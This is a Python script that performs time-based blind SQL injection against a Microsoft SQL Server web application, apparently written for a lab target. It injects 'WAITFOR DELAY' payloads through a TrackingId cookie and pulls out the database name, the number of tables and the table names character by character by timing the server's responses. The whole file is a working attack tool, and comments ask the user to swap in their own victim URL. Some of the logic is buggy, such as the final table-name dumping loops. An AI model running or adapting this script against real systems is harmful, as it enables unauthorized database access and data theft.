#!/usr/bin/python3

import httplib2, string, json
from urllib import parse
from time import time

db_name = ""
table_name_length = []
table_name = ""
table_name_list = []
table_nr = ""
l = 0
alphabet = string.ascii_letters + string.digits
#Adjust to the victim URL
URL = "http://10.129.204.202/"
http = httplib2.Http()

# Evalutes `q` on the server side and returns `true` or `false`
def injector(q):
    boolean = ""
    #Adjust the URL encoded params in Headers
    params = "test';IF(%s) WAITFOR DELAY '0:0:5'--" %(q) 
    url_encode = parse.quote(params)
    headerz = {"Cookie": f"PHPSESSID=3d073kkgqlms936m40vav61k8v; TrackingId={url_encode}"}
    #Start the timer
    t0 = time()
    #Adjust the success message, in this case we are injecting sleep into UA header 
    send = http.request(URL,method="GET",headers=dict(headerz))[1]
    #Stop the timer
    t1= time() - t0
    #Check if response>5sec then Blind-Injection is true
    if (t1 >= 5): 
        boolean = "TRUE" 
        return boolean

#String dumper function
def dumper(q, lenght):
    stringa = ""
    for i in range(lenght + 1):
        for al in range(32,127):
            #Adjust the URL encoded params in Headers
            params = "test';IF(ASCII(SUBSTRING(%s,%s,1))='%s') WAITFOR DELAY '0:0:5'--" %(q, i, al) 
            url_encode = parse.quote(params)
            headerz = {"Cookie": f"PHPSESSID=3d073kkgqlms936m40vav61k8v; TrackingId={url_encode}"}
            #Start the timer
            t0 = time()
            #Adjust the success message, in this case we are injecting sleep into UA header 
            send = http.request(URL,method="GET",headers=dict(headerz))[1]
            #Stop the timer
            t1= time() - t0
            #Check if response>5sec then Blind-Injection is true
            if (t1 >= 5): 
                stringa += chr(al) 
                break
    return stringa


#Getting DB_NAME() Lenght
for i in range(50):
    check = injector(f"(SELECT LEN(DB_NAME()))={i}")
    if (check == "TRUE"):
        l=i
        break
print("DB_Name Lenght: " +  str(l))

#Getting DB_NAME() Exfil
for i in range(1, l+1):
    for al in range(32,127):
        check = injector(f"ASCII(SUBSTRING(DB_NAME(),{i},1))={al}")
        if (check == "TRUE"):
            db_name += chr(al)
            break
print("DB_Name is: " + db_name)

#Getting Tables number
for i in range(50):
    check = injector(f"(SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='{db_name}')={i}")
    if (check == "TRUE"):
        table_nr=i
        break
print(f"Number of Tables in DB {db_name} is: " +  str(table_nr))

#Getting TABLE_NAME Lenght in an List
for i in range(table_nr):
    for y in range(50):
        check = injector(f"(SELECT LEN(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG='{db_name}' ORDER BY TABLE_NAME OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY)={y}")
        if (check == "TRUE"):
            table_name_length.append(y)         
            break

#Print the TABLE_NAME  Lenght
print("The TABLE_NAME Lenght are:")
print(table_name_length)

#Exfiltrating Table_names
for i in table_name_length: #Iterate thru TableName Lenght list
    for j in range(table_nr): #Iterate thru Number of tables in DB
        check = dumper(f"(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG='{db_name}' ORDER BY TABLE_NAME OFFSET {j} ROWS FETCH NEXT 1 ROWS ONLY)", i)
        table_name_list.append(check)
        print(check)
